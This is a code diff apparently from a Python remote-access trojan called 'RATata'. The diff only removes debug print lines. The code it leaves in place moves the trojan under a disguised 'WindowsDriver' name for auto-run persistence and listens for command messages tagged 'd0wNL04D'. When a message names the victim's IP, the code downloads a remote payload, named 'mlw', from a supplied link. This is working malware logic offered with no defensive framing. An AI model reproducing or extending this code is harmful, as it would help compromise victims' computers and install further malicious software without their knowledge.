@@ -53,7 +53,6 @@ path_User = f'''C:/Users/{user}/'''
 # checking if an other RATata is already in auto-run
 if "AppData" in THIS_FOLDER:
     if not "WindowsDriver" in ffname:
-        print("got one")
         path_User = str(path_User) + str(ffname)
         shutil.move(my_file, path_User)
         exit()
@@ -88,22 +87,18 @@ while True:
 
 
         if "d0wNL04D" in data:
-            print("got a download 1 ")
             if my_IP in data:
-                print("GOT A DOWNLOAD")
 
                 res = data.split(",")  # format: "d0wNL04D", {ip}, {exe}, {link}
                 b = 0
                 for link in res:
                     b += 1
-                    print(b)
                     if b == 3:
                         ext = link
                     else:
                         pass
                     if b == 4:
                         mlw = requests.get(link, allow_redirects=True)
-                        print(mlw)
                     else:
                         pass
 
